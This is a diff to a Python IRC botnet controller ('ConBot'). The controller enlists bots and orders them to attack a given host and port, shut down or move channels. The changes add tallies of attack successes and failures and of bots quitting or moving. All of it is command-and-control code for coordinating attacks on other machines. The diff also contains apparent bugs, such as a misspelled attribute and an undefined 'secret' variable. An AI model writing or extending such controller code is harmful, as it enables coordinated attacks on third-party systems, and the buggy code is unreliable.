@@ -28,6 +28,15 @@ class ConBot:
         self._secret = secret
         self._running = True
         self._bots = []
+        
+        self._botcount = 0
+        self._atksucc = 0
+        self._atkfail = 0
+       
+        self._botsmoving = False
+        self._botsquitting = False
+        self._botqcount = 0
+        self._botquit = 0
 
         self._socket = socket.socket()
         self._socket.settimeout(5)
@@ -97,8 +106,28 @@ class ConBot:
                         self._nick = self._nick + str(random.randint(1, 10))
                         self.initConnection()
                     elif command == "QUIT":
-                        #TODO check if it was one of our bots and remove from bot list
-                        pass
+                        sender = prefix[:prefix.index("!")]
+                        if self.knownBot(sender):
+                            cnt = 0
+                            for bot in self._bots:
+                                if bot == sender:
+                                    self._bots.pop(cnt)
+                                    if self._botsquitting:
+                                        self._botqcount = self._botqcount - 1
+                                        self._botquit = self._botquit + 1
+                                        print("{0}: shutting down".format(sender))
+                                    if self._botsmoving:
+                                        self._botqcount = self._botqcount - 1
+                                        self._botquit = self._botquit + 1
+                                        print("{0}: moving".format(sender))
+                                    break;
+                                cnt = cnt + 1
+                            if self._botsquitting and self._botqcount == 0:
+                                print("Total: {0} bots shut down".format(self._botquit))
+                                self._botsquitting = False
+                            if self._botsmoving and self._botqcount == 0:
+                                print("Total: {0} bots moved".format(self._botquit))
+                                self._botsmoving = False
                     elif command == "PRIVMSG":
                         sender = prefix[:prefix.index("!")]
                         channel = args[0]
@@ -107,7 +136,19 @@ class ConBot:
                         if msg == "what is my purpose?":
                             if not self.knownBot(sender):
                                 self._bots.append(sender)
-                            
+                
+                        elif msg == "attack successful":
+                            self._atksucc = self._atksucc + 1
+                            print("{0}: {1}".format(sender,"attack successful"))
+                            if (self._atksucc + self._atkfail) == self._botcount:
+                                print("Total: {0} successful, {1} unsuccessful".format(self._atksucc, self._atkfail))
+                        elif msg == "attack failed, no such hostname":
+                            self._atkfail = self.atkfail + 1
+                            print("{0}: {1}".format(sender,"attack failed, no such hostname"))
+                            if (self._atksucc + self._atkfail) == self._botcount:
+                                print("Total: {0} successful, {1} unsuccessful".format(self._atksucc, self._atkfail))
+
+
                 try:
                     responses = self.logRecv()
                 except socket.timeout:
@@ -133,6 +174,9 @@ class ConBot:
         if len(self._bots) == 0:
             print("!! No known bots. Use the [status] command to find bots")
         else:
+            self._botcount = len(self._bots)
+            self._atksucc = 0
+            self._atkfail = 0
             if len(commandParts) != 3:
                 print("Invalid command syntax. Syntax is attack <host> <port>")
             else:
@@ -170,6 +214,8 @@ class ConBot:
         self._socket.send("QUIT\r\n".encode("utf-8"))
             
     def shutdown(self, command):
+        self._botsquitting = True
+        self._botqcount = len(self._bots)
         for bot in self._bots:
             msg = "PRIVMSG {0} :{1} {2}\r\n".format(bot, secret, command).encode('utf-8')
             self.logSend(msg)
@@ -178,6 +224,8 @@ class ConBot:
         if len(self._bots) == 0:
             print("!! No known bots. Use the [status] command to find bots")
         else:
+            self._botsmoving = True
+            self._botqcount = len(self._bots)
             if len(commandParts) != 4:
                 print("Invalid command syntax. Syntax is: move <host> <port> <channel>")
             else:
@@ -212,19 +260,15 @@ def handleCommands(controller):
         commandParts = command.split()
 
         if commandParts[0] == "status":
-            print("status!")
             controller.status()
         elif commandParts[0] == "attack":
-            print("attack!")
             controller.attack(commandParts)                                                           
         elif commandParts[0] == "quit":
             controller.quit()
             break;
         elif commandParts[0] == "shutdown":
-            print("shutdown!")
             controller.shutdown(commandParts[0])
         elif commandParts[0] == "move":
-            print("move bots!")
             controller.move(commandParts)
         else:
             print("Invalid command!");
